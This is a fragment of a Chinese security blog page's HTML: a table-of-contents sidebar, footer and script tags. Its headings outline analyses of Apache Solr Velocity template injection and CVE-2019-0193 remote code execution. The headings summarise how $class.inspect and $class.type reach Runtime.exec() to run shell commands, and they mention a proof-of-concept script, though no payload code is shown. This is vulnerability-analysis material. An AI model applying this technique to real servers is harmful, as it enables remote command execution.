class="nav-link" href="#Velocity是另一种流行的Java模板语言，使用起来比较棘手。没有“安全注意事项”页面可以帮助指出最危险的功能，也没有明显的默认变量列表。以下屏幕截图显示了用于强制变量名称的Burp-Intruder工具，其中变量名称位于“payload”列的左侧，服务器的输出位于右侧。"><span class="nav-number">1.0.6.10.</span> <span class="nav-text">Velocity是另一种流行的Java模板语言，使用起来比较棘手。没有“安全注意事项”页面可以帮助指出最危险的功能，也没有明显的默认变量列表。以下屏幕截图显示了用于强制变量名称的Burp Intruder工具，其中变量名称位于“payload”列的左侧，服务器的输出位于右侧。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在类，因为它返回一个通用对象变量（高亮）看起来特别有前途。谷歌搜索引导我们到https-velocity-apache-org-tools-releases-2-0-summary-html："><span class="nav-number">1.0.6.11.</span> <span class="nav-text">在类，因为它返回一个通用对象变量（高亮）看起来特别有前途。谷歌搜索引导我们到https://velocity.apache.org/tools/releases/2.0/summary.html：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ClassTool：用于在模板中使用Java反射的工具"><span class="nav-number">1.0.6.12.</span> <span class="nav-text">ClassTool：用于在模板中使用Java反射的工具</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#默认键：-class"><span class="nav-number">1.0.6.13.</span> <span class="nav-text">默认键：$ class</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#一种方法和一种属性脱颖而出："><span class="nav-number">1.0.6.14.</span> <span class="nav-text">一种方法和一种属性脱颖而出：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#class-inspect-类-对象-串-返回一个检查指定类或对象的新ClassTool实例"><span class="nav-number">1.0.6.15.</span> <span class="nav-text">$ class.inspect(类/对象/串)返回一个检查指定类或对象的新ClassTool实例</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#class-type返回正在检查的实际类"><span class="nav-number">1.0.6.16.</span> <span class="nav-text">$ class.type返回正在检查的实际类</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-velocity-apache-org-tools-releases-2-0-summary-html"><span class="nav-number">1.0.6.17.</span> <span class="nav-text">https://velocity.apache.org/tools/releases/2.0/summary.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#换句话说，我们可以使用-class-type-链接-class-inspect以获取对任意对象的引用。然后，我们可以使用Runtime-exec-在目标系统上执行任意shell命令。这可以使用以下模板进行确认，该模板旨在导致明显的时间延迟。"><span class="nav-number">1.0.6.18.</span> <span class="nav-text">换句话说，我们可以使用$ class.type 链接`$ class.inspect以获取对任意对象的引用。然后，我们可以使用Runtime.exec()在目标系统上执行任意shell命令。这可以使用以下模板进行确认，该模板旨在导致明显的时间延迟。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#获取shell命令的输出有点棘手-毕竟这是Java"><span class="nav-number">1.0.6.19.</span> <span class="nav-text">获取shell命令的输出有点棘手(毕竟这是Java):</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#同理上面的shell就是这样构造的"><span class="nav-number">1.0.6.20.</span> <span class="nav-text">同理上面的shell就是这样构造的</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#同时贴出poc的脚本"><span class="nav-number">1.0.6.21.</span> <span class="nav-text">同时贴出poc的脚本</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考资料："><span class="nav-number">1.0.7.</span> <span class="nav-text">参考资料：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-wyzxxz-Apache-Solr-RCE-via-Velocity-template"><span class="nav-number">1.0.7.1.</span> <span class="nav-text">https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#漏洞分析-Apache-Solr-模版注入漏洞-RCE"><span class="nav-number">1.0.7.2.</span> <span class="nav-text">漏洞分析 - Apache Solr 模版注入漏洞(RCE)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#服务器端模板注入"><span class="nav-number">1.0.7.3.</span> <span class="nav-text">服务器端模板注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#http-www-blogjava-net-sxyx2008-archive-2010-11-11-337799-html"><span class="nav-number">1.0.7.4.</span> <span class="nav-text">http://www.blogjava.net/sxyx2008/archive/2010/11/11/337799.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-gist-githubusercontent-com-s00py-a1ba36a3689fa13759ff910e179fc133-raw-fae5e663ffac0e3996fd9dbb89438310719d347a"><span class="nav-number">1.0.7.5.</span> <span class="nav-text">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Apache-Solr-Velocity模板注入RCE漏洞复现"><span class="nav-number">1.0.7.6.</span> <span class="nav-text">Apache Solr Velocity模板注入RCE漏洞复现</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-freebuf-com-vuls-218730-html"><span class="nav-number">1.0.7.7.</span> <span class="nav-text">https://www.freebuf.com/vuls/218730.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-cnblogs-com-yuzly-p-11782608-html"><span class="nav-number">1.0.7.8.</span> <span class="nav-text">https://www.cnblogs.com/yuzly/p/11782608.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-two8g-gitbooks-io-solr-reference-guide-start-run-html"><span class="nav-number">1.0.7.9.</span> <span class="nav-text">https://two8g.gitbooks.io/solr-reference-guide/start/run.html</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02-Apache-Solr-DataImportHandler-远程代码执行漏洞-CVE-2019-0193-分析"><span class="nav-number">1.0.8.</span> <span class="nav-text">0x02 Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193)分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞复现的环境和漏洞的描述请看下面的参考资料一栏"><span class="nav-number">1.0.9.</span> <span class="nav-text">漏洞复现的环境和漏洞的描述请看下面的参考资料一栏</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#下面是构造数据回显"><span class="nav-number">1.0.9.1.</span> <span class="nav-text">下面是构造数据回显</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#回显的结果如下："><span class="nav-number">1.0.9.2.</span> <span class="nav-text">回显的结果如下：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考资料"><span class="nav-number">1.0.10.</span> <span class="nav-text">参考资料</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Apache-Solr-DataImportHandler-远程代码执行漏洞-CVE-2019-0193-分析"><span class="nav-number">1.0.10.1.</span> <span class="nav-text">Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-mp-weixin-qq-com-s-typLOXZCev-9WH-Ux0s6oA"><span class="nav-number">1.0.10.2.</span> <span class="nav-text">https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Apache-Solr-远程命令执行漏洞-CVE-2019-0193-漏洞复现环境"><span class="nav-number">1.0.10.3.</span> <span class="nav-text">Apache Solr 远程命令执行漏洞(CVE-2019-0193)漏洞复现环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-xz-aliyun-com-t-4422"><span class="nav-number">1.0.10.4.</span> <span class="nav-text">https://xz.aliyun.com/t/4422</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">69.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
